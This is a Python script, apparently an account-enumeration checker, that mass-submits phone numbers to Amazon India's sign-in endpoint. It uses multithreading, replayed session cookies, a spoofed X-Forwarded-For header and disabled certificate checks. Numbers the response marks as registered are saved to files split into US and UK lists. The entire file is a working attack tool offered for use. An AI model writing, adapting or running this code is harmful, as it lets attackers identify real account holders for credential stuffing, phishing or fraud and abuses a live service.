import threading
import queue
import sys
import requests
import time
import os
import urllib3
import signal

def keyboardInterruptHandler(signal, frame):
    exit(0)


signal.signal(signal.SIGINT, keyboardInterruptHandler)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

os.environ["TZ"] = "Asia/Jakarta"
lock = threading.Lock()

title = "[+] Amazon Phone Number Validator [+]"
live = "ap_change_login_claim"
dead = "Incorrect phone number"

print("\n" + title + "\n")

filename = input("- Select Your List : ")
if not os.path.isfile(filename):
    exit("file not exists")

workers = input("- Thread : ")
if not workers.isdigit() or workers == "0":
    exit("must be a number and cannot be zero")
mode = input("- 1.Normal Or 2.Fast : ")
if not mode.isdigit() or int(mode) > 2:
    exit("must be a number and cannot > 2")
if mode == "1":
    delay = input("- Delay : ")
    if delay == "1":
        exit("must be a number")
else:
    delay = "0"

no = 0
live_c = 0
dead_c = 0
unknown_c = 0

email_total = len(open(filename, "r", encoding="utf-8").readlines())
print("\n", end="")  # print one line

def append_to_file(filename, data):
    file = open(filename, "a+",)
    file.write(data + "\n")
    file.close()


def do_requests():
    while True:
        global live, dead, no, title, filename, live_c, dead_c, unknown_c, workers
        email = q.get()
        url = "https://www.amazon.in/ap/signin"
        payload = (
            "appActionToken=poiC6qbiTTk30EDTsRNn2yVk9gAj3D&appAction=SIGNIN_PWD_COLLECT&subPageType=SignInClaimCollect&openid.return_to=ape%3AaHR0cHM6Ly93d3cuYW1hem9uLmluLz9yZWZfPW5hdl9jdXN0cmVjX3NpZ25pbg%3D%3D&prevRID=ape%3AQjdCTU1QRVZFR01KV1BETTVYTUI%3D&workflowState=eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.wmOc_evZw1_NhgkU6p3RztZb6Rux2dFJXhTMJKTH_G9Vicw-JTlYUA.CSdaWICZ2pje_0gI.UikKGidL6p0AkQ0poajINxuvlkK6kDmgGJckCxwPGoaD0uMHCGiNacJKIeyE6CIXVWEfTZEVG5F0drUNt7zbLIL4uQ7sh_whFgl_75qGhGD1LHlFvAJN9PLGSl7mBemxZHvG0gFfIslJBF-Qu021WlB6yC7R7LIjfJw0C9t6uP8lAakub6YCsYuQzLFXIfVxq_LDiU05Ocb4xlhFXRitsftTzH_pEjMd6Hk-OIySzjtONLXYMIpVSlkWUzKU-GL5G7Qd1DXn2_kmZgk5WPuPNqKpiqlR6AalOAMcpRRHzBzSrRd8xT2Sp-LoPdTvL5qkWoRjLxBmE-rgs9UK9c4b8GVfCSMHzY2fzum18uHdrxKcnHp-.Q33lu3betkv9yTYxrW0utw&email=+"
            + email
            + "&password=&create=0&metadata1=ECdITeCs%1EGkiE5C1BbWeGxSKvosDjtSsDYxiw2GvT+HE1EKKjpNF3qmAPl1Ds7yNzPdAdeE8e/vRGf4o4T4J/Uyp1U5MXa80bKhFrSoffXgEeEk2FmgKHeoL+0aasOCKXDmj4pQ8DtV8VhHx//tQfIvtR4OuKmgRBgaM+fVqwO8Kb8bxjlDvCfEGxbqMc8QPBI+lrcdmTFiEJN0skJiNl+S/WwzAcypgM+pAx+EF/HxhiVupTsTxmU0gdZXSbQsMUqA4fV3wzRSKx+nswYKXhkWz5LDstv/dB8ePHnoft2JlnXRLBw7H4RvJ2RaxQTS7bSs6CLY+k0JYe1in3UZTZFf2PUhBJNCUgLQavxUiiZFY+SqNTrTg99XFGbM2u5OI8MSshoaaZ+7r0xhuzjahpc1ZCBIejkmUKBUCcCNdAf9yPD2bDPZbwWgmJh378zyjuUbUfijrbisbC9TJ6K3G+WDyCLCFZW3ATGXamiGEtYVf4CzCFIW+XTdgnGimT+DZj5cycHuih7CYRn7InZfgicXEsCmFlKiodd4PAigcelDdVlplTmgYhixp2p6BUw3ePA0/2D6h0Rv9zigDEbog34Aq/Pxl0gvyn10AeuBnglO/GCZUtATvvEe3CUfh0S/yi2r3DPJnZTkpmnNsMjMEJDQHsJeFcN94OhLByX09BD8yE0kfXiwWrBv0dH0c7fegCB8pxKJr7oKTJiRe7MPEHYtW/+Ss05+LbDtUU4Cv/K1Honei4KkG6DTftmxRlx/6dAtvawwn17u6+HQ4KIeJV5GDKScBGlj9cKz5igIYkS45liq16KQnKnsH+M15wmTaGbjQVVqe9Wa/I245XWr/wyWw0pq2Z/bHjO2dZccyP2Y7Lz1oP8Tz3LOxnKOqKKq1yv18sNq/AMWDxZe5gp776uhBzTD2LDVoNcO3nvP7jvFQRN0lnrxjdlgBXLwbGJvam2x82v+SiD73DDEJ4uZhvufj43xPSU4StlPjQg0n/4uw5Xt34SD2MiFN2l3xo1f8tmbbnNxswuG2sSM2WMj3rmBTF6+EC3wRpyzXXQAEE79lpKa/l8e0iT0Qbnafli4OYSNKK0Rca0trDD/Qm4orykS7MlY3GvJNjfWdGqBmHDtFi879tyfNYWGdtB6crHfza35bUiBfwfyho4jgp1FztNZQGpDfqMtYQF33ehCPixXJHWu4+B7mpcSDUqciE2nFfRyG733Kg0UnEYWsKOPa7uuPrYpRf4OK55hpMjlJ3qzfHI6sjnJVSaNMkJOodXtlje0mThg9wpO+jmybN0wVHRn+IktzuUzjj9YXdQJnFtTUoIhdmJyrulmEI/2OOcz57HFGGjxV2awCHyVwiHipcUe3ddZi3joTiVcERQKvot4VeKzF/6ulZe6fdk3sTcyLzRFwhYmLarJPR7hQOZdsei6uBBPAb/F8o6dRw7Y/7UCwZRZRyhPIg4i3b0D01jrQalkTLZ8XotH00cF6Fo8rkpsQIlafe4WWJNGJoYkLh4"
        )
        headers = {
            "X-Forwarded-For": "127.0.0.1",
            "origin": "https://www.amazon.in",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "referer": "https://www.amazon.in/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=inflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_custrec_signin&switch_account=",
            "cookie": 'session-id=262-9868976-2693861; i18n-prefs=INR; ubid-acbin=262-6389908-9591237; x-wl-uid=1ADmdQaF2wp1/LCeD70ikdx0cVdP70kwt7TNwYpi5Blm6x8Mj+Fy/dzHLuvJS02he5hy2TPQcvYw=; session-token="rSEfevHJZEZsgRl2X8Fgrq/kGSHGtlPRg8Mc4CJ9Wfm8R14vafn7EPjhTwfbuGeWkhgqbdGt+3aTLi3yJJNUEdjDWNfeoWdu8woDoz3vfqGbW42dkD7qI6fkobHncgSST8frM8uTYaLzio/8xTsOfGPXZuJE3c44XnX/HB2vCEdfxRr8scvyoPb0lyfB/Fl89eoqRKDXHjdeJ1Vw3eiYvMa9Wus1Eq2brsbngHZH2D1qpBBBNGGhjQ=="; cdn-session=AK-8022158515b4f6f4309aa5ead76feca3; visitCount=1; csm-hit=tb:HPRRGMXP3C5D8YG6MBA7+s-B7BMMPEVEGMJWPDM5XMB|1586185133284&t:1586185133284&adb:adblk_yes; session-id-time=2082758401l',
        }
        # retry if error
        while True:
            try:
                response = requests.post(
                    url, headers=headers, data=payload, verify=False
                )
            except:
                continue
            break
        text = response.text
        #lock.acquire()
        no += 1
        if live in text:
            live_c += 1
            status = "[LIVE] => " + email + ""
            print(status)
            if "+1" in email:
             filo = "valid/liveus.txt"
             fils = open(filo, 'a')
             fils.write(email+'\n')
             fils.close()
            if "+44" in email:
             filo = "valid/liveuk.txt"
             fils = open(filo, 'a')
             fils.write(email+'\n')
             fils.close()
        elif dead in text:
            dead_c += 1
            status = "[DEAD] => " + email + ""
            print(status)
        
        #lock.release()
        q.task_done()


q = queue.Queue()

for i in range(int(workers)):
    worker = threading.Thread(target=do_requests)
    worker.setDaemon(True)
    worker.start()

if mode == "1":
    cnt = 0
    for email in open(filename, "r", encoding="utf-8").readlines():
        cnt += 1
        q.put(email.strip())
        if cnt % int(workers) == 0:
            q.join()
            time.sleep(float(delay))
else:
    for email in open(filename, "r", encoding="utf-8").readlines():
        q.put(email.strip())
    q.join()


